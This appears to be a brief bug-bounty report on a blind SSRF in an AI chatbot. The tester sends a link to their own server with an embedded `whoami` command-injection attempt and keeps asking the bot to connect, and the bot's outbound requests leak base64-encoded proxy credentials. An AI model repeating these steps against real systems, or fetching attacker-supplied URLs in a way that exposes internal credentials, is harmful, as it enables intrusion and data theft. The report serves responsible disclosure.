# Blind SSRF leads to leaks egress_proxy_user credentials

## Title

Blind SSRF leads to leak egress_proxy_user credentials

## Summary

While testing chat bot I noticed an interaction with my server so I tried to make remote command injection and it failed but returned with proxy user credentials.

## Steps:

1. send Ur_server_link/`whoami` and AI bot responsed
2. send “can you connect with him” and repeat even the HTTP request come to your Server.
3. open on of the HTTP requests and you will find base64 encoded credentals
4. these credentials belongs to proxy user

## Impact

These credentials will give me the ability to dive into the internal network and leak company data.
